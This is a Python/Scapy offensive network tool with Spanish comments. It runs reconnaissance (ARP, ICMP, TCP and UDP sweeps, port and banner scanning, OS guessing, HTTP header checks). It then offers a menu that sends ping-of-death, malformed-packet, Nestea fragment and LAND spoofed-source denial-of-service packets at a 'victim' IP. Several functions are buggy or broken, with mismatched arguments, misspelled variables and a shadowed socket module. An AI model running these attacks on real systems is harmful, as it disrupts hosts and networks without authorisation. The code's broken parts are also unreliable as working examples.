#!/usr/bin/python3
# -.- coding: utf-8 -.-

from scapy.all import *
from termcolor import colored
import subprocess as sub
import re, os, sys, nmap, platform, argparse, time, socket, sys, requests

titulo="""
███████╗ ██████╗ █████╗ ███╗   ██╗██████╗  █████╗ ██████╗ ██╗
██╔════╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔══██╗██║
███████╗██║     ███████║██╔██╗ ██║██████╔╝███████║██║  ██║██║
╚════██║██║     ██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║  ██║██║
███████║╚██████╗██║  ██║██║ ╚████║██║     ██║  ██║██████╔╝██║
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═╝

"""
print(colored(titulo,'blue'))

parse = argparse.ArgumentParser()
parse.add_argument("-r", "--range", help="Rango de direcciones a escanear")
#parse.add_argument("-p", "--ports", help="Rango de direcciones a escanear")
parse=parse.parse_args()


def Arp_Ping(ip):

    global hosts
    hosts=[]
    start_time=time.time()
    range_ip=ARP(pdst=ip)
    broadcast=Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet=broadcast/range_ip
    res=srp(final_packet, timeout=2, verbose=False)[0]
    print(colored("[*] ARP Ping\n",'blue', attrs = ['bold']))
    for n in res:
        print(colored("[+] Host: {}        MAC: {}".format(n[1].psrc, n[1].hwsrc),'green', attrs = ['bold']))
        host=n[1].psrc
        hosts.append(host)
    duration=time.time() - start_time
    print(colored("\nCompletada en {0:.3} segundos".format(duration),'green', attrs = ['bold']))
    return hosts

def Tcp_Ping(ip):
    #resultados_tcp = {port:None for port in ports}
    start_time=time.time()
    print(colored("\n[*] TCP Ping\n",'blue', attrs = ['bold']))
    ipDividida = ip.split('.')
    red = ipDividida[0]+'.'+ipDividida[1]+'.'+ipDividida[2]+'.'

    for ip in range (1, 254):
        ans, unans = sr(IP(dst=red + str(ip))/TCP(dport=80, flags="S"))


    for snd,rcv in ans:
        print (rcv.sprintf("IP.src is alive"))

    duration=time.time() - start_time
    print(colored("\nCompletada en {0:.3} segundos".format(duration)),'green', attrs = ['bold'])

def Udp_Ping(ip,ports):
    resultados_udp = {port:None for port in ports}
    start_time=time.time()
    print(colored("\n[*] UDP Ping\n",'blue', attrs = ['bold']))
    range_ip=IP(dst=ip)
    udp=UDP(dport=ports)
    final_packet=range_ip/udp
    res=srp(final_packet, timeout=2, verbose=False)[0]
    if len(res)>0:
        for n in res:
            print("[+] Host: {} está up".format(n[1].src))
    else:
        print("Ningun resultado")
    duration=time.time() - start_time
    print(colored("Completada en {0:.3} segundos".format(duration),'green', attrs = ['bold']))

def Icmp_Ping(ip):
    start_time=time.time()
    TIMEOUT = 0.5
    conf.verb = 0
    print(colored("\n[*] ICMP Ping\n",'blue', attrs = ['bold']))
    ipDividida = ip.split('.')
    red = ipDividida[0]+'.'+ipDividida[1]+'.'+ipDividida[2]+'.'
    for ip in range (1, 254):
        packet = IP(dst=red + str(ip), ttl=20)/ICMP()
        reply = sr1(packet, timeout=TIMEOUT)
        if not (reply is None):
             print (colored("[+] Host: {}".format(packet[IP].dst ) +" está up",'green', attrs = ['bold']))
        else:
             pass

    duration=time.time() - start_time
    print(colored("\nCompletada en {0:.3} segundos".format(duration),'green', attrs = ['bold']))

def Syn_Scan(ip,option):
    if Icmp_Ping(ip):

        option=input("\nPresiona 'p' si quieres escanear un puerto o 'r' para escanear un rango de puertos (1024): ")
        try:
            if option=='p':
                port=int(input("¿Qué puerto quieres escanear?: "))
                Tcp_Ping(ip,port)

            elif option == 'r':
                for ports in chunks(range(1,1024),100):
                    resultados_tcp=Tcp_Ping(ip,ports)
                    for p,r in resultados_tcp.items():
                        print(""+p+":"+r)
                    resultados_udp=Udp_Ping(ip,ports)
                    for p,r in resultados_udp.items():
                        print(""+p+":"+r)
                duration= time.time()-start_time
                print(colored("%s Scan completado en %fs"+ip,duration,'green', attrs = ['bold']))
            else:
                print(colored("No se introdujo una opcion correcta\n",'red', attrs = ['bold']))
        except Exception as e:
            print (colored(e,'red', attrs = ['bold']))

def Puerto_abierto(hosts,ports):
    global ports_open
    ports_open=[]
    for port in range(1,1024):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result=s.connect_ex((hosts,port))
        if result == 0:
            print("Puerto abierto")
            ports_open.append(port)
        else:
            print("Puerto no abierto")
            s.close()
    return ports_open

def Banner_Grabbing(ip):

    print(colored("\n[+] Enumeracion Banner Grabbing vulnerables",'blue', attrs = ['bold']))
    for host in hosts:
        ports=open('ports.txt', 'r')
        vulnbanners= open('vuln_banner.txt', 'r')
        for port in ports:
            try:
                Puerto_abierto(hosts,ports)
                socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.connect((str(host), int(port)))
                print(colored("Conectando con "+str(host)+'en el puerto: '+str(port),'blue', attrs = ['bold']))
                socket.settimeout(1)
                banner = socket.recv(1024)
                for vulbanner in vulbanners:
                    if banner.strip() in vulbanner.strip():
                        print (colored("Banner vulnerable: "+banner+"\nHost:"+ip+"\nPuerto: "+str(port),'red', attrs = ['bold']))
                    else:
                        print(colored("Host: "+str(host)+" no tiene un banner vulnerable",'green', attrs = ['bold']))

            except:
                print(colored("Error conectando con el host: "+str(host)+':'+str(port),'red', attrs = ['bold']))


def OS_enumeration(ip):
    if (platform.system() == "Windows"):
        ping="ping -n 1 "
    else:
        ping= "ping -c 1 "

    print(colored("\n[+] Enumeracion Sistema Operativo",'blue', attrs = ['bold']))
    try:
        for host in hosts:
            response= os.popen(ping + ""+host)
            for line in response.readlines():
                if("ttl=128" in line.lower()):
                    print(colored("El Host {} es Windows".format(host),'green', attrs = ['bold']))
                elif ("ttl=64" in line.lower()):
                    print(colored("El Host {} es Linux".format(host),'green', attrs = ['bold']))
                else:
                    pass

    except Exception as e:
        print (e)

def Http_enumeration(ip):
    print(colored("\n[+] Enumeracion HTTP: \n",'blue', attrs = ['bold']))

    try:
        url=input("Introduce url (Ej: www.google.com): ")
        response=requests.head("https://"+url)

        '''XSS PROTECTION'''
        if (response.headers['X-XSS-Protection']) == '0':
            print (colored("X-XSS-Protection -> implementada pero desactivada la proteccion",'yellow', attrs = ['bold']))
        elif (response.headers['X-XSS-Protection']) == '1':
            print (colored("X-XSS-Protection -> implementada y activada la proteccion",'green', attrs = ['bold']))
        else:
            print (colored("X-XSS-Protection -> no implementada",'red', attrs = ['bold']))
            pass

        '''HTTP Strict Transport Security (HSTS)'''

        if 'Strict-Transport-Security' in response.headers:
            print(colored("Strict-Transport-Security -> implementada",'green', attrs = ['bold']))
        else:
            print(colored("Strict-Transport-Security -> no implementado",'red', attrs = ['bold']))

        '''X-Frame-Options'''
        if (response.headers["X-Frame-Options"])=='deny':
            print(colored("X-Frame-Options -> implementada, la web no puede ser cargada nunca como iframe: ",'green', attrs = ['bold']))
        elif (response.headers["X-Frame-Options"])=='SAMEORIGIN':
             print(colored("X-Frame-Options -> implementada, la web solo puede ser cargada en el mismo dominio",'yellow', attrs = ['bold']))
        elif (response.headers["X-Content-Type-Options: "])=='allow':
            print (colored("X-Frame-Options -> implementada, la web solo podra ser cargda como iframe en el mismo dominio",'yellow', attrs = ['bold']))
        else :
            print(colored("X-Content-Type-Options -> no implementado",'red', attrs = ['bold']))

        ''' X-XSS-Protection'''
        if (response.headers["X-XSS-Protection"]=='0'):
            print(colored("X-XSS-Protection -> implementada pero nivel de seguridad bajo",'yellow', attrs = ['bold']))
        elif (response.headers["X-XSS-Protection"]=='1'):
            print(colored("X-XSS-Protection -> implementada y nivel de seguridad alto",'green', attrs = ['bold']))
        else:
            print(colored("X-XSS-Protection -> no implementado",'red', attrs = ['bold']))

        '''X-Content-Type-Options'''
        if 'Content-Type' in response.headers:
            print(colored("Content-Type -> implementado",'green', attrs = ['bold']))
        else:
            print(colored("Content-Type -> no implementado",'red', attrs = ['bold']))
    except Exception as e:
        print (colored(e,'red', attrs = ['bold']))

def chunks(l,n):
    for i in range(0, len(l), n):
        yield l[i:i +n]

def Ataques():
    salir = False
    opcion = 0
    while not salir:
        print (colored("1. Ping de la muerte",'green', attrs = ['bold']))
        print (colored("2. Paquetes mal formados",'green', attrs = ['bold']))
        print (colored("3. Ataque Nestea",'green', attrs = ['bold']))
        print (colored("4. Ataque LAND",'green', attrs = ['bold']))
        print (colored("5. Salir",'green', attrs = ['bold']))

        opcion = int(input("Elige una opcion: "))

        if opcion == 1:
            '''Ping de la muerte'''
            ip_victima=input("Introduce la IP de la victima: ")
            print(colored("\nEmpezando ataque ping de la muerte...",'yellow', attrs = ['bold']))
            send(fragment(IP(dst=ip_victima)/ICMP()/('X'*60000)))
            print("\n")

        elif opcion == 2:
            '''Paquetes mal formados'''
            ip_victima=input("Introduce la IP de la victima: ")
            print(colored("\nEmpezando formateo erroneo de los paquetes...",'yellow', attrs = ['bold']))
            send(IP(dst= ip_victima , ihl=2,version=3)/ICMP())
            print("\n")

        elif opcion == 3:
            '''Ataque Nestea'''
            print(colored("\nEmpezando ataque Nestea...",'yellow', attrs = ['bold']))
            ip_victima=input("Introduce la IP de la victima: ")
            send(IP(dst=ip_victima, id=42, flags='MF')/UDP()/('X'*10))
            send(IP(dst=ip_victima, id=42, frag=48)/('X'*116))
            send(IP(dst=ip_victima, id=42, flags='MF')/UDP()/('X'*224))
            print("\n")

        elif opcion == 4:
            '''Ataque LAND'''
            print(colored("\nEmpezando ataque LAND...",'yellow', attrs = ['bold']))
            ip_victima=input("Introduce la IP de la victima: ")
            port_victima=int(input("Introduce un puerto de la victima: "))
            send(IP(src=ip_victima,dst=ip_victima)/TCP(sport=port_victima,dport=port_victima))
            print("\n")

        elif opcion == 5:
            salir=True
            print ("Saliendo ...")
        else:
            print ("Introduce un numero entre 1 y 5")



def Reconnaissance(ip):
    Arp_Ping(ip)
    #Icmp_Ping(ip)
    #Tcp_Ping(ip)
    #Udp_Ping(ip)



def main():
    if parse.range:
        Reconnaissance(parse.range)
        #Syn_Scan(parse.range,option)
        Banner_Grabbing(parse.range)
        OS_enumeration(parse.range)
        Http_enumeration(parse.range)

        option=input(colored("\n¿Quieres llevar a cabo ataques contra una victima (S/N): ",'yellow', attrs = ['bold']))

        if (option == "S" or option =="Si"):
            Ataques()
        elif (option == "N" or option =='No'):
            print("Saliendo...")

    else:
        print(colored("[-] Necesito un rango de IP's a escanear\n",'red', attrs = ['bold']))

if __name__== "__main__":
    main()
